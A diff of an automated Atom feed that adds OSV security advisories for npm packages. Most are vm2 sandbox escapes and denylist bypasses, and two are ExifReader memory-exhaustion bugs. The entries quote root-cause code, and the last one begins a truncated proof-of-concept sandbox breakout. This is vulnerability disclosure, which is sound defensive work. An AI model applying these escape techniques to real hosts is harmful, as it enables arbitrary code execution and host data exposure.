@@ -3,12 +3,509 @@
   <title>OSV — new &amp; updated vulnerabilities: npm</title>
   <subtitle>Open-source vulns affecting npm packages, last 48h. Source: OSV.dev (CC-BY-4.0).</subtitle>
   <id>tag:cshintov.github.io,2026:osv-rss:npm</id>
-  <updated>2026-05-29T07:46:36Z</updated>
+  <updated>2026-05-29T18:30:08Z</updated>
   <link rel="self" href="https://cshintov.github.io/osv-rss/npm.xml"/>
   <link rel="alternate" href="https://osv.dev/"/>
   <author><name>osv-rss (data from OSV.dev)</name></author>
   <rights>Vulnerability data from OSV.dev and upstream sources (e.g. GitHub Advisory Database), licensed CC-BY-4.0.</rights>
   <generator uri="https://github.com/cshintov/osv-rss">osv-rss</generator>
+  <entry>
+    <title>[NEW] GHSA-9g8x-92q2-p28f: NodeVM observability builtins leak host process and HTTP request data</title>
+    <id>https://osv.dev/vulnerability/GHSA-9g8x-92q2-p28f</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-9g8x-92q2-p28f"/>
+    <published>2026-05-29T18:20:45Z</published>
+    <updated>2026-05-29T18:30:08Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47141"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;NodeVM observability builtins leak host process and HTTP request data&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47141&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:L/SI:N/SA:N/E:U&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+`NodeVM` exposes some process-wide observability builtins when they are allowed through `require.builtin`.
+
+The following builtins are not blocked by the dangerous builtin denylist:
+
+```text
+diagnostics_channel
+async_hooks
+perf_hooks
+```
+
+These modules are process-wide, not sandbox-local. Sandboxed code can use them to observe host application data across the vm2 boundary.
+
+**Note**: It is a host data exposure issue. The impact depends on whether the host application allows these builtins and uses HTTP, async request context, diagnostics channels, or performance marks in the same process.
+
+## Details
+
+Non-denied builtins are exposed to the sandbox through `lib/builtin.js`:
+
+```js
+builtins.set(key, special ? special : vm =&amp;gt; vm.readonly(hostRequire(key)));
+```
+
+`diagnostics_chann…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-9g8x-92q2-p28f"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-9g8x-92q2-p28f&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/e1c48fce05189f48e71efbd32af0754efa4066bb"&gt;https://github.com/patriksimek/vm2/commit/e1c48fce05189f48e71efbd32af0754efa4066bb&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-9g8x-92q2-p28f"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-h64w-w9pr-82m4: ExifReader is vulnerable to denial of service via crafted ICC `mluc` tag</title>
+    <id>https://osv.dev/vulnerability/GHSA-h64w-w9pr-82m4</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-h64w-w9pr-82m4"/>
+    <published>2026-05-29T17:58:37Z</published>
+    <updated>2026-05-29T18:15:08Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-8813"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;ExifReader is vulnerable to denial of service via crafted ICC `mluc` tag&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-8813&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H · CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;exifreader&lt;/code&gt; — fixed in 4.39.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Impact
+
+When parsing an image with an embedded ICC profile that contains a crafted `multiLocalizedUnicodeType` (`mluc`) tag, ExifReader can be made to allocate memory proportional to attacker-controlled fields in the tag rather than to
+the actual size of the input. Processing such an image causes excessive memory consumption and can terminate the host process (out-of-memory).
+
+Any application that calls `ExifReader.load()` on untrusted images, for example, user uploads in a web service, is affected. ICC profiles are carried in JPEG, TIFF, PNG, HEIC, AVIF, JPEG XL, and WebP, so the issue is reachable from any of those formats.
+
+### Patches
+
+Fixed in `exifreader@4.39.0`. Upgrade with:
+
+    npm install exifreader@latest
+
+Bower users consume the bundled `dist/` files from this repository, …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/mattiasw/ExifReader/security/advisories/GHSA-h64w-w9pr-82m4"&gt;https://github.com/mattiasw/ExifReader/security/advisories/GHSA-h64w-w9pr-82m4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8813"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-8813&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/mattiasw/ExifReader/commit/c9d88b67e127b2dcc7b46e328df468257fb2dc30"&gt;https://github.com/mattiasw/ExifReader/commit/c9d88b67e127b2dcc7b46e328df468257fb2dc30&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://gist.github.com/yuki-matsuhashi/3243ea38e5fbf8cfe19b624f04c9f4b4"&gt;https://gist.github.com/yuki-matsuhashi/3243ea38e5fbf8cfe19b624f04c9f4b4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/mattiasw/ExifReader"&gt;https://github.com/mattiasw/ExifReader&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://security.snyk.io/vuln/SNYK-JS-EXIFREADER-16689335"&gt;https://security.snyk.io/vuln/SNYK-JS-EXIFREADER-16689335&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-h64w-w9pr-82m4"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-rp36-8xq3-r6c4: NodeVM builtin denylist bypass via process and inspector/promises allows host code execution</title>
+    <id>https://osv.dev/vulnerability/GHSA-rp36-8xq3-r6c4</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-rp36-8xq3-r6c4"/>
+    <published>2026-05-29T17:59:23Z</published>
+    <updated>2026-05-29T18:15:08Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47140"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;NodeVM builtin denylist bypass via process and inspector/promises allows host code execution&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47140&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+`NodeVM` blocks several dangerous Node.js builtins such as `module`, `worker_threads`, `cluster`, `vm`, `repl`, and `inspector`.
+
+However, the denylist misses `process` and `inspector/promises`. Both can be used from sandboxed code to reach host-side execution primitives.
+
+This allows sandboxed code to bypass the intended builtin restrictions and execute code in the host process.
+
+## Details
+
+The dangerous builtin denylist is defined in `lib/builtin.js`. This list does not include:
+
+```text
+process
+inspector/promises
+```
+
+Non-denied builtins are exposed to the sandbox through:
+
+```js
+builtins.set(key, special ? special : vm =&amp;gt; vm.readonly(hostRequire(key)));
+```
+
+Because of this, sandboxed code can bypass the expected restrictions in two ways:
+
+1. `require(&amp;#x27;process&amp;#x27;).getBuiltin…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-rp36-8xq3-r6c4"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-rp36-8xq3-r6c4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/a1ed47a98d1cc36cb48c0d566d55889688e0b59b"&gt;https://github.com/patriksimek/vm2/commit/a1ed47a98d1cc36cb48c0d566d55889688e0b59b&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-rp36-8xq3-r6c4"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-r9pm-gxmw-wv6p: NodeVM network builtin exclusions bypass via internal _http_client and _http_server</title>
+    <id>https://osv.dev/vulnerability/GHSA-r9pm-gxmw-wv6p</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-r9pm-gxmw-wv6p"/>
+    <published>2026-05-29T18:08:06Z</published>
+    <updated>2026-05-29T18:15:08Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47139"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;NodeVM network builtin exclusions bypass via internal _http_client and _http_server&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47139&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+`NodeVM` supports excluding public network builtins from the wildcard builtin option. With this configuration direct access to `http`, `https`, `http2`, `net`, `dgram`, `tls`, `dns`, and `dns/promises` is blocked.
+
+However, Node.js also exposes underscored internal HTTP builtins such as `_http_client` and `_http_server`. These are not blocked when the public modules are excluded.
+
+Sandboxed code can use these internal builtins to make outbound HTTP requests and open listening HTTP sockets even though the public network modules are denied.
+
+**Note**: This is not host RCE. It is a network capability bypass that can lead to SSRF-style access to internal services.
+
+## Details
+
+The wildcard builtin expansion is based on Node.js builtin module names:
+
+```js
+const BUILTIN_MODULES = (n…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-r9pm-gxmw-wv6p"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-r9pm-gxmw-wv6p&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/436053e30eecbabd487e2fd2959c137ac34e2bb1"&gt;https://github.com/patriksimek/vm2/commit/436053e30eecbabd487e2fd2959c137ac34e2bb1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-r9pm-gxmw-wv6p"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-rr89-w3h9-m66j: ExifReader is vulnerable to denial of service via unbounded decompression of image metadata</title>
+    <id>https://osv.dev/vulnerability/GHSA-rr89-w3h9-m66j</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-rr89-w3h9-m66j"/>
+    <published>2026-05-29T17:52:26Z</published>
+    <updated>2026-05-29T18:00:19Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-8814"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;ExifReader is vulnerable to denial of service via unbounded decompression of image metadata&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-8814&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L · CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;exifreader&lt;/code&gt; — fixed in 4.39.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Impact
+
+Versions of ExifReader from 4.20.0 through 4.38.1 do not bound the size of decompressed metadata blocks. When a caller invokes the asynchronous API (e.g. `ExifReader.load(file)` or `ExifReader.load(buffer, {async: true})`) on an attacker-supplied image, a small compressed chunk in the file can expand to hundreds of megabytes of memory, consuming heap and CPU until the process slows down or runs out of memory.
+
+The affected paths share a single decompression utility, so the issue is reachable through any compressed metadata block the library handles asynchronously, including:
+
+- PNG `zTXt`, compressed `iTXt`, and `iCCP` chunks (deflate)
+- JPEG XL Brotli-compressed Exif and XMP blocks
+
+A typical proof of concept produced roughly 1000× expansion (for example, ~32 KB of compressed …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/mattiasw/ExifReader/security/advisories/GHSA-rr89-w3h9-m66j"&gt;https://github.com/mattiasw/ExifReader/security/advisories/GHSA-rr89-w3h9-m66j&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8814"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-8814&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/mattiasw/ExifReader/commit/5f116128adc19f674902f8bf582bfe7dd0a36375"&gt;https://github.com/mattiasw/ExifReader/commit/5f116128adc19f674902f8bf582bfe7dd0a36375&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://gist.github.com/yuki-matsuhashi/cad1a45d936062438b4ab24613c34c55"&gt;https://gist.github.com/yuki-matsuhashi/cad1a45d936062438b4ab24613c34c55&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/mattiasw/ExifReader"&gt;https://github.com/mattiasw/ExifReader&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://security.snyk.io/vuln/SNYK-JS-EXIFREADER-16689340"&gt;https://security.snyk.io/vuln/SNYK-JS-EXIFREADER-16689340&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-rr89-w3h9-m66j"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-m5q2-4fm3-vfqp: vm2 has a sandbox escape via unblocked cross-realm Symbol.for keys + missing bridge write-trap symbol checks</title>
+    <id>https://osv.dev/vulnerability/GHSA-m5q2-4fm3-vfqp</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-m5q2-4fm3-vfqp"/>
+    <published>2026-05-29T17:44:32Z</published>
+    <updated>2026-05-29T18:00:18Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47135"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;vm2 has a sandbox escape via unblocked cross-realm Symbol.for keys + missing bridge write-trap symbol checks&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47135&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+vm2 3.11.2 `Symbol.for` override in `setup-sandbox.js` only intercepts 2 of 9 dangerous Node.js cross-realm symbols. Combined with the bridge&amp;#x27;s `set`/`defineProperty`/`deleteProperty` traps having **no** `isDangerousCrossRealmSymbol` key check, sandbox code can obtain real cross-realm symbols, write them to host objects, and control host-side behavior — verified with a full `util.promisify` hijack chain.
+
+## Root Cause
+
+**1. Incomplete `Symbol.for` override** (`setup-sandbox.js:132-142`):
+
+```js
+Symbol.for = function (key) {
+    const keyStr = &amp;#x27;&amp;#x27; + key;
+    if (keyStr === &amp;#x27;nodejs.util.inspect.custom&amp;#x27;) return blockedSymbolCustomInspect;
+    if (keyStr === &amp;#x27;nodejs.rejection&amp;#x27;) return blockedSymbolRejection;
+    return originalSymbolFor(keyStr); // everything else passes through
+};…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-m5q2-4fm3-vfqp"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-m5q2-4fm3-vfqp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/928aef51898b5c52a05f05a40c4cfeb52e172878"&gt;https://github.com/patriksimek/vm2/commit/928aef51898b5c52a05f05a40c4cfeb52e172878&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-m5q2-4fm3-vfqp"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-m4wx-m65x-ghrr: vm2 has a CVE-2023-37903 patch bypass: nesting:true without explicit require still allows full RCE</title>
+    <id>https://osv.dev/vulnerability/GHSA-m4wx-m65x-ghrr</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-m4wx-m65x-ghrr"/>
+    <published>2026-05-29T17:50:22Z</published>
+    <updated>2026-05-29T18:00:17Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47137"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;vm2 has a CVE-2023-37903 patch bypass: nesting:true without explicit require still allows full RCE&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47137&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+The fix for GHSA-8hg8-63c5-gwmx (CVE-2023-37903) introduced a check in `nodevm.js` line 263 that blocks the combination `nesting: true` + `require: false`. However, the check uses strict equality (`options.require === false`), which is trivially bypassed by omitting the `require` option entirely.
+
+When `require` is not specified, `options.require` is `undefined`, not `false`. The strict equality check fails, so the security guard is skipped. Immediately after (line 280), the destructuring default `require: requireOpts = false` assigns `requireOpts = false`, producing the exact configuration the patch was designed to prevent.
+
+## Root Cause
+
+```javascript
+// nodevm.js:263 — the security check
+if (options.nesting === true &amp;amp;&amp;amp; options.require === false) {
+    throw new VMError(&amp;#x27;...…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-m4wx-m65x-ghrr"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-m4wx-m65x-ghrr&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/01a7552add345d5a6862623884e6b79a85bf0568"&gt;https://github.com/patriksimek/vm2/commit/01a7552add345d5a6862623884e6b79a85bf0568&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/86ab819f202c3a8dad88cef5705f2e416c5188d7"&gt;https://github.com/patriksimek/vm2/commit/86ab819f202c3a8dad88cef5705f2e416c5188d7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-m4wx-m65x-ghrr"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-c4cf-2hgv-2qv6: vm2's Bridge Proxy set trap ignores receiver parameter, enabling host object property injection via prototype chain</title>
+    <id>https://osv.dev/vulnerability/GHSA-c4cf-2hgv-2qv6</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-c4cf-2hgv-2qv6"/>
+    <published>2026-05-29T17:49:18Z</published>
+    <updated>2026-05-29T18:00:12Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47209"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;vm2&amp;#x27;s Bridge Proxy set trap ignores receiver parameter, enabling host object property injection via prototype chain&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47209&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+The `BaseHandler.set` trap in `bridge.js` (line 1231) ignores the `receiver` parameter and unconditionally writes to the host target object. Per the Proxy `set` trap specification, when `receiver !== proxy` (e.g., when a child object inherits from the proxy via `Object.create`), the property assignment should create an own property on the receiver, not on the proxy target. The current implementation always calls `otherReflectSet(object, key, value)` against the host target, causing **all inherited property writes to leak through to the host object**.
+
+This bug provides an alternative attack vector for writing dangerous cross-realm Symbol keys (e.g., `nodejs.util.promisify.custom`) to host objects, bypassing any future per-trap `isDangerousCrossRealmSymbol` guard on the direct `…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-c4cf-2hgv-2qv6"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-c4cf-2hgv-2qv6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/26d0318b5e6555be4b187ba05d6cf378ccecfe22"&gt;https://github.com/patriksimek/vm2/commit/26d0318b5e6555be4b187ba05d6cf378ccecfe22&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-c4cf-2hgv-2qv6"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-6j2x-vhqr-qr7q: vm2 sandbox escape via JSPI-backed Promise `.finally()` species bypass</title>
+    <id>https://osv.dev/vulnerability/GHSA-6j2x-vhqr-qr7q</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-6j2x-vhqr-qr7q"/>
+    <published>2026-05-29T17:51:05Z</published>
+    <updated>2026-05-29T18:00:11Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47210"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;vm2 sandbox escape via JSPI-backed Promise `.finally()` species bypass&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47210&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+A sandbox escape vulnerability in `vm2` allows arbitrary code execution in the host process when untrusted code is executed with async support on runtimes exposing WebAssembly JSPI (`WebAssembly.promising` / `WebAssembly.Suspending`). In the tested configuration, a JSPI-backed Promise can reach `Promise.prototype.finally()` in a way that bypasses the expected Promise-species hardening and exposes a host-originated rejection object to attacker-controlled species logic, breaking the sandbox boundary.
+
+This is a critical sandbox escape: any application that treats `vm2` as a security boundary may be fully compromised.
+
+### Details
+
+On node26, JSPI-backed Promises created through `WebAssembly.promising(...)` do not behave like ordinary sandbox Promises.
+
+That path yields a host-ori…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-6j2x-vhqr-qr7q"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-6j2x-vhqr-qr7q&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/6915fa4d9bcebd47b9a4f39a1adc1aa94ef6ffc6"&gt;https://github.com/patriksimek/vm2/commit/6915fa4d9bcebd47b9a4f39a1adc1aa94ef6ffc6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-6j2x-vhqr-qr7q"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-76w7-j9cq-rx2j: vm2 is Vulnerable to Sandbox Breakout Through Promise Species</title>
+    <id>https://osv.dev/vulnerability/GHSA-76w7-j9cq-rx2j</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-76w7-j9cq-rx2j"/>
+    <published>2026-05-29T17:40:15Z</published>
+    <updated>2026-05-29T17:45:21Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47208"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;vm2 is Vulnerable to Sandbox Breakout Through Promise Species&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47208&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.
+
+### Details
+
+The `localPromise` constructor was changed to call `this.then(undefined, eater)` to ensure a rejected promise is always used. However, this is missing a call to `resetPromiseSpecies` to ensure that `this` has no special species. Since the species can be changed a custom promise can be used to supply a custom reject method to the executor allowing to get a raw host error and escape the sandbox.
+
+### PoC
+
+```js
+const {VM} = require(&amp;quot;vm2&amp;quot;);
+const vm = new VM();
+vm.run(`
+class E extends Error {}
+function so(d) {
+	if (d &amp;gt; 0) so(d-1);
+	const e = new E();
+	e.stack;
+	throw e;
+}
+let ex, ct;
